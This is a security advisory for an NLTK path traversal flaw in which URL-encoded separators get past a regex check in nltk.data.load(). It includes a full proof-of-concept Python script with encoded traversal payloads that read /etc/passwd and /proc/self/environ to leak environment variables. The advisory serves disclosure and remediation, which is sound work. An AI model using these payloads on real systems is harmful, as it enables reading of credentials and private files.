# [H] Natural Language Toolkit (NLTK): URL-Encoded Path Traversal in nltk.data.load() Allows Arbitrary Local File Read

## Summary
Severity: High
Advisory: GHSA-p4gq-832x-fm9v
CVE: CVE-2026-54293
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-p4gq-832x-fm9v
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
### Summary
nltk.data.load() in NLTK is vulnerable to path traversal via URL-encoded path separators and traversal segments when using the nltk: URL scheme. The unsafe-path regex check is performed before url2pathname() decodes the %xx sequences (a classic decode-after-check / TOCTOU-style flaw), allowing an attacker to bypass the protection documented in NLTK's SECURITY.md and read arbitrary files from the filesystem.
While literal traversal strings such as ../../../etc/passwd are correctly blocked, encoded variants such as %2fetc%2fpasswd, %2e%2e%2f..., and ..%2f..%2f slip past the regex and are subsequently decoded into a real filesystem path.
### Affected Component
nltk/data.py — find(), normalize_resource_url(), and the _UNSAFE_NO_PROTOCOL_RE regex check.
Relevant occurrences:

data.py L650–L653 — final path constructed from url2pathname(resource_name) after checks
data.py L54–L69 — _UNSAFE_NO_PROTOCOL_RE operates only on the undecoded string
data.py L219–L245 — normalize_resource_url() for nltk: scheme contributes to decode-after-check
data.py L615–L618 — defense-in-depth traversal check also operates on undecoded input

Root Cause
The regex _UNSAFE_NO_PROTOCOL_RE is matched against the raw resource string. Path normalization via url2pathname() happens later, so any percent-encoded / (%2f) or . (%2e) is invisible to the regex but becomes active in the final path.
### Proof of Concept
```
"""
NLTK Arbitrary File Read via URL-Encoded Path Traversal
=======================================================
Bypasses _UNSAFE_NO_PROTOCOL_RE security regex in nltk/data.py
by URL-encoding path separators and traversal components.

Affected: NLTK <= 3.9.4 (default ENFORCE=False configuration)
CWE: CWE-22 (Path Traversal)

Root Cause:
  nltk/data.py:find() checks resource names against a regex for
  traversal patterns (../, leading /, etc.) BEFORE calling
  url2pathname() which decodes %xx sequences. This is a classic
  "decode-after-check" vulnerability.
"""

import sys
import os
import warnings

# Suppress NLTK security warnings for clean PoC output
warnings.filterwarnings("ignore", category=RuntimeWarning)

# Setup
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "nltk"))
os.makedirs(os.path.expanduser("~/nltk_data/corpora"), exist_ok=True)

import nltk
from nltk.pathsec import ENFORCE

BANNER = """
===================================================
 NLTK URL-Encoded Path Traversal PoC
 Affected: nltk <= 3.9.4
 Default ENFORCE={enforce}
===================================================
""".format(enforce=ENFORCE)

def test_variant(name, payload, fmt="raw"):
    """Test a single traversal variant."""
    try:
        content = nltk.data.load(payload, format=fmt)
        if isinstance(content, bytes):
            preview = content[:200].decode("utf-8", errors="replace")
        else:
            preview = content[:200]
        first_line = preview.split("\n")[0]
        print(f"  [VULN] {name}")
        print(f"         Payload: {payload}")
        print(f"         Read OK: {first_line}")
        return True
    except Exception as e:
        print(f"  [SAFE] {name}")
        print(f"         Payload: {payload}")
        print(f"         Blocked: {type(e).__name__}: {e}")
        return False


def main():
    print(BANNER)
    vulns = 0

    # --- Variant 1: URL-encoded absolute path ---
    print("[1] URL-encoded absolute path (%2f = /)")
    if test_variant(
        "Encoded leading slash bypasses ^/ regex check",
        "nltk:%2fetc%2fpasswd",
    ):
        vulns += 1

    print()

    # --- Variant 2: Encoded dot-dot traversal ---
    print("[2] URL-encoded dot-dot traversal (%2e = .)")
    if test_variant(
        "Encoded dots bypass \\.\\./ regex check",
        "nltk:corpora/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ):
        vulns += 1

    print()

    # --- Variant 3: Literal dots with encoded slash ---
    print("[3] Literal dots with encoded slash (..%2f)")
    if test_variant(
        "Encoded slash after literal .. bypasses \\.\\./ regex",
        "nltk:corpora/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    ):
        vulns += 1

    print()

    # --- Variant 4: Read process environment (credential leak) ---
    print("[4] Read /proc/self/environ (credential leakage)")
    try:
        content = nltk.data.load("nltk:%2fproc%2fself%2fenviron", format="raw")
        env_vars = content.decode("utf-8", errors="replace").split("\x00")
        print(f"  [VULN] Leaked {len(env_vars)} environment variables")
        for var in env_vars[:3]:
            if var:
                key = var.split("=")[0] if "=" in var else var
                print(f"         {key}=...")
        vulns += 1
    except Exception as e:
        print(f"  [SAFE] Blocked: {e}")

    print()

    # --- Control: verify normal traversal IS blocked ---
    print("[CONTROL] Verify literal ../ is blocked by regex")
    test_variant("Direct traversal (should be blocked)", "nltk:../../../etc/passwd")

    print()
    print("=" * 51)
    print(f" Result: {vulns} bypass variant(s) succeeded")
    if vulns > 0:
        print(" Status: VULNERABLE (url2pathname decodes after regex check)")
    else:
        print(" Status: Not vulnerable")
    print("=" * 51)


if __name__ == "__main__":
    main()
```
### Impact
Arbitrary local file read whenever attacker-controlled input reaches nltk.data.load(). Realistic targets include:

/etc/passwd, /etc/shadow (if readable)
/proc/self/environ — leaks environment variables, often containing API keys, DB credentials, cloud secrets
Application source code and configuration files
Cloud metadata, deployment secrets, SSH keys

This is directly relevant to web applications, hosted notebook services, multi-tenant ML pipelines, and CI/CD systems that pass untrusted resource identifiers into NLTK. NLTK's SECURITY.md explicitly places path traversal within the scope of its protection model, so this is a documented security boundary being broken.

### fix
https://github.com/nltk/nltk/pull/3575

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-p4gq-832x-fm9v
- https://nvd.nist.gov/vuln/detail/CVE-2026-54293
- https://github.com/nltk/nltk/pull/3575
- https://access.redhat.com/errata/RHSA-2026:42644
- https://access.redhat.com/security/cve/CVE-2026-54293
- https://bugzilla.redhat.com/show_bug.cgi?id=2491486
- https://github.com/nltk/nltk
- https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-2078.yaml
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54293.json
